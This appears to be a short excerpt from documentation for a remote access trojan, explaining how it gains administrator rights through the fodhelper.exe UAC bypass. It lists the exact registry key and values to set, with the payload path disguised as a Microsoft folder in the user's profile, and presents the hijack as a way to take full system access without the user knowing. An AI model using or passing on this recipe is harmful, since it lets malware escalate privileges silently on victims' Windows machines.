UAC BYPASS: FODHELPER METHOD

This is how the R.A.T. gets Admin without the user knowing. It exploits the "auto-elevate" feature of fodhelper.exe (a Windows Features tool). By writing to a specific registry key, the malware tells Windows: "When you run Fodhelper, run me instead."

# Registry keys used for the hijack:
HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
(Default) = "C:\Users\Target\AppData\Local\Microsoft\Windows\NtProfileIndex\python.exe"
DelegateExecute = ""

Since fodhelper.exe is a trusted Microsoft binary, Windows doesn't show a UAC prompt, giving the attacker full system access silently.
